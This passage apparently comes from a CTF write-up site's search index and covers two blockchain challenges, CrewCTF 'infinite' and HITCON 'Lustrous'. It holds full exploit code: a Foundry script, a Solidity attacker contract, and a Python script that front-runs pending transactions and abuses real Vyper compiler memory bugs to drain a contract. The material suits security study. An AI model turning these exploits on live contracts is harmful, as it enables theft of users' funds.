$INSTANCE_ADDR --broadcast contract InfiniteScript is Script { function run ( address instance ) public { vm . startBroadcast (); Setup setup = Setup ( instance ); crewToken crew = setup . CREW (); respectToken respect = setup . RESPECT (); candyToken candy = setup . CANDY (); fancyStore store = setup . STORE (); localGang gang = setup . GANG (); crew . mint (); crew . approve ( address ( store ), 1 ); store . verification (); candy . approve ( address ( gang ), 50 ); respect . approve ( address ( store ), 50 ); for ( uint i ; i < 5 ; ++ i ) { gang . gainRespect ( 10 ); store . buyCandies ( 10 ); } vm . stopBroadcast (); } } Flag \u00b6 crew{inf1nt3_c4n9i3s_1nfinit3_r3s9ect}","title":"infinite"},{"location":"blockchain/infinite/#description","text":"Infinite respect. nc infinite.chal.crewc.tf 60001 infinite.tar.gz","title":"Description"},{"location":"blockchain/infinite/#solution","text":"To solve the challenge, we need to store more than 50 respect tokens in the fancyStore contract 1 2 3 function isSolved () public view returns ( bool ) { return STORE . respectCount ( CREW . receiver ()) >= 50 ; } The respectToken and candyToken contracts do not contain any significant information, as they are simple ERC20 token contracts that allow the owner to call the mint() and burn() functions The crewToken contract with a mint() function that can only be called once is the entry point 1 2 3 4 5 6 function mint () external { require ( ! claimed , \"already claimed\" ); receiver = msg . sender ; claimed = true ; _mint ( receiver , 1 ); } Next, we can exchange 1 crew token for 10 candies 1 2 3 4 5 6 7 8 function verification () public payable { require ( crew . balanceOf ( msg . sender ) == 1 , \"You don't have crew tokens to verify\" ); require ( crew . allowance ( msg . sender , address ( this )) == 1 , \"You need to approve the contract to transfer crew tokens\" ); crew . transferFrom ( msg . sender , address ( this ), 1 ); candy . mint ( msg . sender , 10 ); } The candy tokens can be exchanged for respect tokens through fancyStore.sellCandies() or localGang.gainRespect() . But these two functions have a slight difference. The sellCandies() function burns candy tokens and transfers the respect tokens stored in the contract to the msg.sender, while the gainRespect() function transfers the candy tokens from the msg.sender and mint respect tokens to msg.sender. Thus, the total supply of respect tokens can be increased through gainRespect() . Similarly, we can increase the total supply of candy tokens through fancyStore.buyCandies() Starting with 10 candy tokens, we can first exchange them for 10 respect tokens and increase candyCount through localGang.gainRespect() . Then, buy 10 candies and increase respectCount through fancyStore.buyCandies() . At this point, we have obtained an additional 10 candies and transferred 10 respect tokens to the fancyStore contract XD Repeat these steps until STORE.respectCount(CREW.receiver()) reaches the desired threshold","title":"Solution"},{"location":"blockchain/infinite/#script","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /// forge script script/Infinite.s.sol --private-key $PRIVATE_KEY --rpc-url $RPC_URL --sig \"run(address)\" $INSTANCE_ADDR --broadcast contract InfiniteScript is Script { function run ( address instance ) public { vm . startBroadcast (); Setup setup = Setup ( instance ); crewToken crew = setup . CREW (); respectToken respect = setup . RESPECT (); candyToken candy = setup . CANDY (); fancyStore store = setup . STORE (); localGang gang = setup . GANG (); crew . mint (); crew . approve ( address ( store ), 1 ); store . verification (); candy . approve ( address ( gang ), 50 ); respect . approve ( address ( store ), 50 ); for ( uint i ; i < 5 ; ++ i ) { gang . gainRespect ( 10 ); store . buyCandies ( 10 ); } vm . stopBroadcast (); } }","title":"Script"},{"location":"blockchain/infinite/#flag","text":"crew{inf1nt3_c4n9i3s_1nfinit3_r3s9ect}","title":"Flag"},{"location":"blockchain/lustrous/","tags":["smart contract","vyper","frontrun","buffer overflow","compiler bug"],"text":"#smart contract #vyper #frontrun #buffer overflow #compiler bug .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 \"In a world inhabited by crystalline lifeforms called The Lustrous, every unique gem must fight for their way of life against the threat of lunarians who would turn them into decorations.\" \u2013 Land of the Lustrous nc lustrous.chal.hitconctf.com 31337 land_of_the_lustrous.vy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 #pragma version ==0.3.10 enum GemStatus : ACTIVE INACTIVE DESTROYED struct Gem : health : int256 max_health : int256 attack : int256 hardness : int256 status : GemStatus struct Lunarian : health : int256 attack : int256 rounds : uint256 interface Master : def get_actions () -> DynArray [ uint8 , MAX_ROUNDS ]: view def decide_continue_battle ( round : uint256 , lunarian_health : int256 ) -> bool : nonpayable stage : public ( uint8 ) master_addr : public ( address ) lunarian_addr : public ( address ) sequences : public ( HashMap [ address , uint32 ]) gems : public ( HashMap [ bytes32 , Gem ]) assigned_gems : public ( HashMap [ address , uint32 ]) continued : public ( HashMap [ address , bool ]) ACTIVE_HEALTH_THRESHOLD : constant ( int256 ) = 64 STAGES : constant ( uint8 ) = 3 MAX_ROUNDS : constant ( uint256 ) = 300 LUNARIANS : constant ( Lunarian [ STAGES ]) = [ Lunarian ({ health : 1_000 , attack : 10_000 , rounds : 100 }), Lunarian ({ health : 10_000 , attack : 100_000 , rounds : 200 }), Lunarian ({ health : 1 << 64 , attack : 1 << 128 , rounds : 300 }), ] @external @payable def __init__ (): assert msg . value == as_wei_value ( 1_000_000 , \"ether\" ) self . lunarian_addr = msg . sender @external @view def is_solved () -> bool : return self . balance == 0 @external def register_master (): assert self . master_addr == empty ( address ), \"master already registered\" self . master_addr = msg . sender @external def transfer_master ( new_master_addr : address ): assert self . master_addr != empty ( address ), \"master not registered\" assert self . master_addr == msg . sender , \"only master can transfer master\" self . master_addr = new_master_addr @external @payable def create_gem () -> Gem : assert self . master_addr == msg . sender , \"only master can create gem\" assert msg . value == as_wei_value ( 1 , \"ether\" ), \"invalid value\" random : int256 = abs ( convert ( keccak256 ( convert ( block . number , bytes32 )), int256 )) gem : Gem = Gem ({ health : max ( random % 256 , ACTIVE_HEALTH_THRESHOLD ), max_health : random % 256 , attack : ( random / 256 ) % 256 , hardness : ( random / ( 256 * 256 )) % 256 , status : GemStatus . ACTIVE , }) self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ])] = gem self . sequences [ msg . sender ] += 1 return gem @external def merge_gems () -> Gem : assert self . master_addr == msg . sender , \"only master can merge gems\" assert self . sequences [ msg . sender ] >= 2 , \"not enough gems to merge\" gem1 : Gem = self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 2 )] gem2 : Gem = self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 1 )] assert ( gem1 . status == GemStatus . ACTIVE and gem2 . status == GemStatus . INACTIVE ) \\ or ( gem1 . status == GemStatus . INACTIVE and gem2 . status == GemStatus . ACTIVE ) \\ or ( gem1 . status == GemStatus . INACTIVE and gem2 . status == GemStatus . INACTIVE ), \"invalid gem status\" gem : Gem = Gem ({ health : gem1 . health + gem2 . health , max_health : gem1 . max_health + gem2 . max_health , attack : gem1 . attack + gem2 . attack , hardness : ( gem1 . hardness + gem2 . hardness ) / 2 , status : self . calc_status ( gem1 . health + gem2 . health ), }) self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 2 )] = gem self . sequences [ msg . sender ] -= 1 return gem @external def pray_gem (): assert self . master_addr == msg . sender , \"only master can pray gem\" assert self . sequences [ msg . sender ] >= 1 , \"not enough gems to pray\" self . sequences [ msg . sender ] -= 1 @external def assign_gem ( sequence : uint32 ): assert self . master_addr == msg . sender , \"only master can assign gem\" self . assigned_gems [ msg . sender ] = sequence @external def battle ( lunarian_actions : DynArray [ uint8 , MAX_ROUNDS ]) -> ( bool , int256 , int256 ): assert self . lunarian_addr == msg . sender , \"only lunarian can start battle\" assert self . master_addr != empty ( address ), \"master not registered\" assert self . stage < STAGES , \"invalid stage\" lunarian : Lunarian = LUNARIANS [ self . stage ] master : Master = Master ( self . master_addr ) gem_actions : DynArray [ uint8 , MAX_ROUNDS ] = master . get_actions () gem_id : bytes32 = self . get_gem_id ( self . master_addr , self . assigned_gems [ self . master_addr ]) assert self . assigned_gems [ self . master_addr ] < self . sequences [ self . master_addr ], \"invalid assigned gem\" assert len ( lunarian_actions ) == lunarian . rounds and len ( gem_actions ) == lunarian . rounds , \"invalid actions\" assert self . gems [ gem_id ] . status == GemStatus . ACTIVE , \"gem is not active\" for r in range ( lunarian . rounds , bound = MAX_ROUNDS ): # rock paper scissors lunarian_action : uint8 = lunarian_actions [ r ] gem_action : uint8 = gem_actions [ r ] assert lunarian_action <= 2 and gem_action <= 2 , \"invalid action\" if lunarian_action == gem_action : continue master_win : bool = ( lunarian_action == 0 and gem_action == 1 ) \\ or ( lunarian_action == 1 and gem_action == 2 ) \\ or ( lunarian_action == 2 and gem_action == 0 ) if master_win : lunarian . health -= self . gems [ gem_id ] . attack else : self . gems [ gem_id ] . health -= lunarian . attack / self . gems [ gem_id ] . hardness if self . calc_status ( self . gems [ gem_id ] . health ) != GemStatus . ACTIVE : master . decide_continue_battle ( r , lunarian . health ) if self . continued [ self . master_addr ]: self . continued [ self . master_addr ] = False self . gems [ gem_id ] . health = self . gems [ gem_id ] . max_health self . gems [ gem_id ] . status = self . calc_status ( self . gems [ gem_id ] . health ) if self . gems [ gem_id ] . status != GemStatus . ACTIVE or lunarian . health <= 0 : break if self . gems [ gem_id ] . status == GemStatus . ACTIVE \\ and ( lunarian . health <= 0 or lunarian . health < self . gems [ gem_id ] . health ): if self . stage == 0 : send ( self . master_addr , as_wei_value ( 1 , \"ether\" )) self . stage += 1 elif self . stage == 1 : send ( self . master_addr , as_wei_value ( 2 , \"ether\" )) self . stage += 1 elif self . stage == 2 : send ( self . master_addr , self . balance ) # congratz :) return True , lunarian . health , self . gems [ gem_id ] . health else : self . stage = 0 return False , lunarian . health , self . gems [ gem_id ] . health @external @payable def continue_battle (): assert self . master_addr == msg . sender , \"only master can continue battle\" assert msg . value == as_wei_value ( 1 , \"ether\" ), \"invalid value\" self . continued [ msg . sender ] = True @internal @pure def get_gem_id ( master_addr : address , sequence : uint32 ) -> bytes32 : master_addr_bytes : bytes20 = convert ( master_addr , bytes20 ) sequence_bytes : bytes4 = convert ( sequence , bytes4 ) gem_id : bytes32 = keccak256 ( concat ( master_addr_bytes , sequence_bytes )) return gem_id @internal @pure def calc_status ( health : int256 ) -> GemStatus : if ACTIVE_HEALTH_THRESHOLD <= health : return GemStatus . ACTIVE elif 0 <= health : return GemStatus . INACTIVE else : return GemStatus . DESTROYED Solution \u00b6 Initially, there are 1,000,000 ether deposited into the contract, which we have to drain and solve the challenge. Only the battle() function in the contract can obtain ether The battle has three stages, each corresponding to a lunarian with different health and attack power. At each stage, if gem is still active and has more health than the lunarian after all rounds are over, the corresponding stage funds will go to us. Getting 1 or 2 ether each time has little effect, while the instance will automatically terminate in 10 minutes. Obviously, we have to win stage 2 1 2 3 4 5 6 7 8 9 10 11 if self . gems [ gem_id ] . status == GemStatus . ACTIVE \\ and ( lunarian . health <= 0 or lunarian . health < self . gems [ gem_id ] . health ): if self . stage == 0 : send ( self . master_addr , as_wei_value ( 1 , \"ether\" )) self . stage += 1 elif self . stage == 1 : send ( self . master_addr , as_wei_value ( 2 , \"ether\" )) self . stage += 1 elif self . stage == 2 : send ( self . master_addr , self . balance ) # congratz :) The winner of each round in a stage is determined by lunarian_actions array and an array returned by master.get_actions() . We don't have permission to call the battle() function, but we can obtain lunarian_actions from the pending transaction. Then, front run the transaction of battle() to set gem_actions and win each round as desired :D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 @external def battle ( lunarian_actions : DynArray [ uint8 , MAX_ROUNDS ]) -> ( bool , int256 , int256 ): assert self . lunarian_addr == msg . sender , \"only lunarian can start battle\" assert self . master_addr != empty ( address ), \"master not registered\" assert self . stage < STAGES , \"invalid stage\" lunarian : Lunarian = LUNARIANS [ self . stage ] master : Master = Master ( self . master_addr ) gem_actions : DynArray [ uint8 , MAX_ROUNDS ] = master . get_actions () gem_id : bytes32 = self . get_gem_id ( self . master_addr , self . assigned_gems [ self . master_addr ]) ... for r in range ( lunarian . rounds , bound = MAX_ROUNDS ): # rock paper scissors lunarian_action : uint8 = lunarian_actions [ r ] gem_action : uint8 = gem_actions [ r ] assert lunarian_action <= 2 and gem_action <= 2 , \"invalid action\" if lunarian_action == gem_action : continue master_win : bool = ( lunarian_action == 0 and gem_action == 1 ) \\ or ( lunarian_action == 1 and gem_action == 2 ) \\ or ( lunarian_action == 2 and gem_action == 0 ) ... The lunarian in stage 2 has a huge amount of health but the initial attack of the gem is only 255 at most. It costs 1 ether to create a gem, and we only start with 1.5 ether. Even if we can merge gems to increase the attack power of a gem, it is still difficult to win in 300 rounds 1 2 3 4 5 LUNARIANS : constant ( Lunarian [ STAGES ]) = [ Lunarian ({ health : 1_000 , attack : 10_000 , rounds : 100 }), Lunarian ({ health : 10_000 , attack : 100_000 , rounds : 200 }), Lunarian ({ health : 1 << 64 , attack : 1 << 128 , rounds : 300 }), ] A master can have multiple gems. The data of each gem is stored in the contract via gem_id . The gem_id is the hash of master_addr and a sequence number. The get_gem_id() internal function uses the concat built-in function, which is related to a memory buffer overflow vulnerability 1 . That is, if a function calls an internal function that uses concat , the leading bytes of its first declared variable may be overwritten with zeros. In get_gem_id() , sequence_bytes will be mloaded and mstored right after previous copied master_addr_bytes , causing a 20-byte memory buffer overflow 1 2 3 4 5 6 7 @internal @pure def get_gem_id ( master_addr : address , sequence : uint32 ) -> bytes32 : master_addr_bytes : bytes20 = convert ( master_addr , bytes20 ) sequence_bytes : bytes4 = convert ( sequence , bytes4 ) gem_id : bytes32 = keccak256 ( concat ( master_addr_bytes , sequence_bytes )) return gem_id During the battle, if the gem is not in an active health, master.decide_continue_battle will be called, giving us the opportunity to merge gems and get a gem with negative health. By combining the vulnerability of concat , we can obtain a gem with high health to win the battle ;) 1 2 3 4 5 6 7 8 9 10 11 12 13 @external def merge_gems () -> Gem : ... gem : Gem = Gem ({ health : gem1 . health + gem2 . health , max_health : gem1 . max_health + gem2 . max_health , attack : gem1 . attack + gem2 . attack , hardness : ( gem1 . hardness + gem2 . hardness ) / 2 , status : self . calc_status ( gem1 . health + gem2 . health ), }) self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 2 )] = gem self . sequences [ msg . sender ] -= 1 return gem Exploitation \u00b6 The exploitation steps are as follows: Create gem0 with a favorable attack value and win stage 0 with it Create gem1 with a favorable health and draw stage 1 to reset stage to 0 without losing any health Intentionally lose stage 0 with gem1 to make its status inactive Win stage 0 with gem0 In stage 1, gem0 's health can go negative with only one attack. During the master.decide_continue_battle() , gem0 is still active and can pass the status check in merge_gems() along with gem1 . After merging, gem0 has enough health to win stage 1 and 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 contract Master { int256 constant ACTIVE_HEALTH_THRESHOLD = 64 ; ILandOfTheLustrous land ; uint8 [] actions ; bool canMerge ; constructor ( ILandOfTheLustrous _land ) { land = _land ; _land . register_master (); } function first () external payable { int256 random = int256 ( uint256 ( keccak256 ( abi . encode ( block.number )))); if ( random < 0 ) { random = - random ; } require (( random / 256 ) % 256 >= 10 ); land . create_gem { value : 1 ether }(); land . assign_gem ( 0 ); } function second () external { int256 random = int256 ( uint256 ( keccak256 ( abi . encode ( block.number )))); if ( random < 0 ) { random = - random ; } int256 health = random % 256 ; if ( health < ACTIVE_HEALTH_THRESHOLD ) { health = ACTIVE_HEALTH_THRESHOLD ; } int256 hardness = ( random / ( 256 * 256 )) % 256 ; while ( health >= ACTIVE_HEALTH_THRESHOLD ) { health -= 10 _000 / hardness ; } require ( health >= 0 ); land . create_gem { value : 1 ether }(); land . assign_gem ( 1 ); } function third () external { land . assign_gem ( 0 ); canMerge = true ; } function set_actions ( uint8 [] memory lunarian_actions , uint256 start , uint8 draw ) external { uint256 len = lunarian_actions . length ; uint8 [] memory _actions = new uint8 []( len ); for ( uint256 i ; i < start ; i ++ ) { _actions [ i ] = ( lunarian_actions [ i ] + 2 + draw ) % 3 ; } for ( uint256 i = start ; i < len ; i ++ ) { _actions [ i ] = ( lunarian_actions [ i ] + 1 ) % 3 ; } actions = _actions ; } function get_actions () external view returns ( uint8 [] memory ) { return actions ; } function decide_continue_battle ( uint256 , int256 ) external returns ( bool ) { if ( canMerge ) { land . merge_gems (); } return true ; } receive () external payable {} } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 import pwn import hashlib import time from typing import Callable from threading import Thread from cheb3 import Connection from cheb3.utils import load_compiled , decode_data def connect (): return pwn . remote ( \"lustrous.chal.hitconctf.com\" , 31337 ) def solve_pow ( p ): cmd = p . recvline_contains ( b \"python3\" ) . decode () . strip () . split ( \" \" ) preimage_prefix = cmd [ - 2 ] . encode () bits = int ( cmd [ - 1 ]) for i in range ( 0 , 1 << 32 ): your_input = str ( i ) . encode () preimage = preimage_prefix + your_input digest = hashlib . sha256 ( preimage ) . digest () digest_int = int . from_bytes ( digest , \"big\" ) if digest_int < ( 1 << ( 256 - bits )): ans = your_input break p . sendlineafter ( b \"YOUR_INPUT =\" , ans ) def do_battle (): p = connect () p . sendlineafter ( b \"action?\" , b \"3\" ) solve_pow ( p ) p . sendlineafter ( b \"uuid please:\" , uuid ) time . sleep ( 5 ) p . close () def frontrun ( handler : Callable ) -> bool : pending_filter = conn . w3 . eth . filter ( 'pending' ) battle_thread = Thread ( target = do_battle , args = []) battle_thread . start () while True : pending_entries = pending_filter . get_new_entries () if pending_entries != []: print ( \"[+] Frontrunning\" ) for txn_hash in pending_entries : txn = conn . w3 . eth . get_transaction ( txn_hash ) if txn [ 'to' ] == land_addr : decoded_input = decode_data ( txn [ 'input' ][ 4 :], [ \"uint8[]\" ]) handler ( decoded_input , txn [ 'gasPrice' ]) return True if not battle_thread . is_alive (): print ( \"[-] Frontrun failed\" ) return False def frontrun_handler ( lunarian_actions : list [ int ], gas_price : int ): master . functions . set_actions ( lunarian_actions , start_index , to_draw ) . send_transaction ( gas_price = gas_price + 100 ) p = connect () p . sendlineafter ( b \"action?\" , b \"1\" ) solve_pow ( p ) uuid = p . recvline_contains ( b \"uuid:\" ) . split ( b \" \" )[ - 1 ] print ( f \" { uuid = } \" ) conn = Connection ( p . recvline_contains ( b \"rpc endpoint:\" ) . decode () . split ( \" \" )[ - 1 ]) account = conn . account ( p . recvline_contains ( b \"private key:\" ) . decode () . split ( \" \" )[ - 1 ]) land_addr = p . recvline_contains ( b \"challenge contract:\" ) . decode () . split ( \" \" )[ - 1 ] land_abi , _ = load_compiled ( \"ILandOfTheLustrous.sol\" ) land = conn . contract ( account , abi = land_abi , address = land_addr ) master_abi , master_bin = load_compiled ( \"PoC.t.sol\" , \"Master\" ) master = conn . contract ( account , abi = master_abi , bytecode = master_bin ) master . deploy ( land_addr ) while True : try : master . functions . first () . send_transaction ( value = int ( 1e18 )) break except : continue start_index , to_draw = 0 , 0 frontrun ( frontrun_handler ) # win stage 0 while True : try : master . functions . second () . send_transaction () break except : continue start_index , to_draw = 200 , 1 frontrun ( frontrun_handler ) # draw stage 1 start_index , to_draw = 100 , 0 frontrun ( frontrun_handler ) # lose stage 0 master . functions . third () . send_transaction () start_index = 0 frontrun ( frontrun_handler ) # win stage 0 start_index = 1 frontrun ( frontrun_handler ) # lose -> merge -> win stage 1 start_index = 0 frontrun ( frontrun_handler ) # win stage 2 print ( \"solved?\" , land . caller . is_solved ()) if land . caller . is_solved (): p = connect () p . sendlineafter ( b \"action?\" , b \"4\" ) p . sendlineafter ( b \"uuid please:\" , uuid ) p . interactive () Flag \u00b6 hitcon{f1y_m3_t0_th3_m00n_3a080ea144010d74} Appendix \u00b6 By checking the author's writeup , there is another vulnerability 2 that is also expected to be utilized Argument(s) is (are) encoded as a tuple. The ABI encoding of a tuple consists of two areas: the statically encoded head and the dynamically encoded tail . For dynamic types, the head contains the offset of the location within the tail where the data is stored Prior to Vyper 0.4.0, the ABI decoder does not have a buffer overflow check for dynamic offsets. To decode data containing dynamic types, the decoder will retrieve the actual data with the offset information and the raw data location in the memory Vyper stores all variables in memory, including primitives Take _abi_decode(x, Bytes[32]) as an example. Assume that the variable x is stored in memory starting from 0x140. According to the specified type, the decoder will get the actual data position by calculating offset+0x160 . In this example, the bytes string data is stored in memory starting from 0x180 (0x20+0x160) 1 2 3 4 0x140 0x0000000000000000000000000000000000000000000000000000000000000060 [length] 0x160 0x0000000000000000000000000000000000000000000000000000000000000020 [encoded bytes - offset] 0x180 0x0000000000000000000000000000000000000000000000000000000000000003 [encoded bytes - length] 0x1a0 0x666f6f0000000000000000000000000000000000000000000000000000000000 [encoded bytes - data] By setting the offset to a value that causes the position calculation to overflow, it is possible to decode arbitrary data in the memory. In the above example, we can set the offset to 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa0 to decode data located at 0x100 In this challenge, we can let master.get_actions() return a byte string containing a specific offset to achieve the purpose of copying the lunarian's actions without front-running References \u00b6 The Vyper Compiler - by jtriley.eth concat built-in can corrupt memory \u00b7 Advisory \u00b7 vyperlang/vyper \u21a9 _abi_decode Memory Overflow \u00b7 Advisory \u00b7 vyperlang/vyper \u21a9","title":"Lustrous"},{"location":"blockchain/lustrous/#description","text":"\"In a world inhabited by crystalline lifeforms called The Lustrous, every unique gem must fight for their way of life against the threat of lunarians who would turn them into decorations.\" \u2013 Land of the Lustrous nc lustrous.chal.hitconctf.com 31337 land_of_the_lustrous.vy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 #pragma version ==0.3.10 enum GemStatus : ACTIVE INACTIVE DESTROYED struct Gem : health : int256 max_health : int256 attack : int256 hardness : int256 status : GemStatus struct Lunarian : health : int256 attack : int256 rounds : uint256 interface Master : def get_actions () -> DynArray [ uint8 , MAX_ROUNDS ]: view def decide_continue_battle ( round : uint256 , lunarian_health : int256 ) -> bool : nonpayable stage : public ( uint8 ) master_addr : public ( address ) lunarian_addr : public ( address ) sequences : public ( HashMap [ address , uint32 ]) gems : public ( HashMap [ bytes32 , Gem ]) assigned_gems : public ( HashMap [ address , uint32 ]) continued : public ( HashMap [ address , bool ]) ACTIVE_HEALTH_THRESHOLD : constant ( int256 ) = 64 STAGES : constant ( uint8 ) = 3 MAX_ROUNDS : constant ( uint256 ) = 300 LUNARIANS : constant ( Lunarian [ STAGES ]) = [ Lunarian ({ health : 1_000 , attack : 10_000 , rounds : 100 }), Lunarian ({ health : 10_000 , attack : 100_000 , rounds : 200 }), Lunarian ({ health : 1 << 64 , attack : 1 << 128 , rounds : 300 }), ] @external @payable def __init__ (): assert msg . value == as_wei_value ( 1_000_000 , \"ether\" ) self . lunarian_addr = msg . sender @external @view def is_solved () -> bool : return self . balance == 0 @external def register_master (): assert self . master_addr == empty ( address ), \"master already registered\" self . master_addr = msg . sender @external def transfer_master ( new_master_addr : address ): assert self . master_addr != empty ( address ), \"master not registered\" assert self . master_addr == msg . sender , \"only master can transfer master\" self . master_addr = new_master_addr @external @payable def create_gem () -> Gem : assert self . master_addr == msg . sender , \"only master can create gem\" assert msg . value == as_wei_value ( 1 , \"ether\" ), \"invalid value\" random : int256 = abs ( convert ( keccak256 ( convert ( block . number , bytes32 )), int256 )) gem : Gem = Gem ({ health : max ( random % 256 , ACTIVE_HEALTH_THRESHOLD ), max_health : random % 256 , attack : ( random / 256 ) % 256 , hardness : ( random / ( 256 * 256 )) % 256 , status : GemStatus . ACTIVE , }) self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ])] = gem self . sequences [ msg . sender ] += 1 return gem @external def merge_gems () -> Gem : assert self . master_addr == msg . sender , \"only master can merge gems\" assert self . sequences [ msg . sender ] >= 2 , \"not enough gems to merge\" gem1 : Gem = self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 2 )] gem2 : Gem = self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 1 )] assert ( gem1 . status == GemStatus . ACTIVE and gem2 . status == GemStatus . INACTIVE ) \\ or ( gem1 . status == GemStatus . INACTIVE and gem2 . status == GemStatus . ACTIVE ) \\ or ( gem1 . status == GemStatus . INACTIVE and gem2 . status == GemStatus . INACTIVE ), \"invalid gem status\" gem : Gem = Gem ({ health : gem1 . health + gem2 . health , max_health : gem1 . max_health + gem2 . max_health , attack : gem1 . attack + gem2 . attack , hardness : ( gem1 . hardness + gem2 . hardness ) / 2 , status : self . calc_status ( gem1 . health + gem2 . health ), }) self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 2 )] = gem self . sequences [ msg . sender ] -= 1 return gem @external def pray_gem (): assert self . master_addr == msg . sender , \"only master can pray gem\" assert self . sequences [ msg . sender ] >= 1 , \"not enough gems to pray\" self . sequences [ msg . sender ] -= 1 @external def assign_gem ( sequence : uint32 ): assert self . master_addr == msg . sender , \"only master can assign gem\" self . assigned_gems [ msg . sender ] = sequence @external def battle ( lunarian_actions : DynArray [ uint8 , MAX_ROUNDS ]) -> ( bool , int256 , int256 ): assert self . lunarian_addr == msg . sender , \"only lunarian can start battle\" assert self . master_addr != empty ( address ), \"master not registered\" assert self . stage < STAGES , \"invalid stage\" lunarian : Lunarian = LUNARIANS [ self . stage ] master : Master = Master ( self . master_addr ) gem_actions : DynArray [ uint8 , MAX_ROUNDS ] = master . get_actions () gem_id : bytes32 = self . get_gem_id ( self . master_addr , self . assigned_gems [ self . master_addr ]) assert self . assigned_gems [ self . master_addr ] < self . sequences [ self . master_addr ], \"invalid assigned gem\" assert len ( lunarian_actions ) == lunarian . rounds and len ( gem_actions ) == lunarian . rounds , \"invalid actions\" assert self . gems [ gem_id ] . status == GemStatus . ACTIVE , \"gem is not active\" for r in range ( lunarian . rounds , bound = MAX_ROUNDS ): # rock paper scissors lunarian_action : uint8 = lunarian_actions [ r ] gem_action : uint8 = gem_actions [ r ] assert lunarian_action <= 2 and gem_action <= 2 , \"invalid action\" if lunarian_action == gem_action : continue master_win : bool = ( lunarian_action == 0 and gem_action == 1 ) \\ or ( lunarian_action == 1 and gem_action == 2 ) \\ or ( lunarian_action == 2 and gem_action == 0 ) if master_win : lunarian . health -= self . gems [ gem_id ] . attack else : self . gems [ gem_id ] . health -= lunarian . attack / self . gems [ gem_id ] . hardness if self . calc_status ( self . gems [ gem_id ] . health ) != GemStatus . ACTIVE : master . decide_continue_battle ( r , lunarian . health ) if self . continued [ self . master_addr ]: self . continued [ self . master_addr ] = False self . gems [ gem_id ] . health = self . gems [ gem_id ] . max_health self . gems [ gem_id ] . status = self . calc_status ( self . gems [ gem_id ] . health ) if self . gems [ gem_id ] . status != GemStatus . ACTIVE or lunarian . health <= 0 : break if self . gems [ gem_id ] . status == GemStatus . ACTIVE \\ and ( lunarian . health <= 0 or lunarian . health < self . gems [ gem_id ] . health ): if self . stage == 0 : send ( self . master_addr , as_wei_value ( 1 , \"ether\" )) self . stage += 1 elif self . stage == 1 : send ( self . master_addr , as_wei_value ( 2 , \"ether\" )) self . stage += 1 elif self . stage == 2 : send ( self . master_addr , self . balance ) # congratz :) return True , lunarian . health , self . gems [ gem_id ] . health else : self . stage = 0 return False , lunarian . health , self . gems [ gem_id ] . health @external @payable def continue_battle (): assert self . master_addr == msg . sender , \"only master can continue battle\" assert msg . value == as_wei_value ( 1 , \"ether\" ), \"invalid value\" self . continued [ msg . sender ] = True @internal @pure def get_gem_id ( master_addr : address , sequence : uint32 ) -> bytes32 : master_addr_bytes : bytes20 = convert ( master_addr , bytes20 ) sequence_bytes : bytes4 = convert ( sequence , bytes4 ) gem_id : bytes32 = keccak256 ( concat ( master_addr_bytes , sequence_bytes )) return gem_id @internal @pure def calc_status ( health : int256 ) -> GemStatus : if ACTIVE_HEALTH_THRESHOLD <= health : return GemStatus . ACTIVE elif 0 <= health : return GemStatus . INACTIVE else : return GemStatus . 